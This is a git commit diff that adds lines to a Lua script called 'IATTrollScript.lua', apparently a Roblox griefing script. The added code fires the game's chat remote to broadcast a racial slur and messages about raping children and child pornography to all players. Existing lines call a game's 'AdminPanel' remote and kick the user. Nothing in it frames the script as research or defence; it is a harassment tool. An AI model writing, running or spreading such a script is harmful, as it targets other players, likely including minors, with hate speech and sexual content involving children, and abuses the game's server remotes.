fd34e7a76d37726ce72fbdf4dc63fd52bb74efd4
flatterart99873 <109747402+flatterart99873@users.noreply.github.com>
2023-01-03 21:59:10 +0100

    Update IATTrollScript.lua

--- IATTrollScript.lua
+++ IATTrollScript.lua
@@ -1,2 +1,38 @@
+local args = {
+    [1] = "nigger",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+local args = {
+    [1] = "i eat children",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+local args = {
+    [1] = "rape children nigger",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+local args = {
+    [1] = "i sex",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+local args = {
+    [1] = "child porn",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+
 game:GetService("ReplicatedStorage"):WaitForChild("Essentals"):WaitForChild("AdminPanel"):FireServer()
 game.Players.LocalPlayer:Kick("Nah bro...")
